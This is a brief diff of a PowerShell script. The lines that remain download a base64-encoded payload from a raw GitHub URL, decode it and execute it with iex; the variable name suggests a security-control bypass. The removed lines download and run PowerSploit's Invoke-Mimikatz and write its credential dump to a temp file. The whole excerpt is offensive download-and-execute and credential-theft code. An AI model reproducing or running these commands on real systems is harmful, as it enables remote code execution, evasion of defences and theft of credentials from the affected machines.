@@ -3,5 +3,3 @@ $jonsbypassencoded = (New-Object Net.WebClient).DownloadString("https://raw.gith
 $jonsbypass = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($jonsbypassencoded));
 $jonsbypass;
 iex $jonsbypass;
-iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1");
-Invoke-Mimikatz > c:\temp\ignore.txt
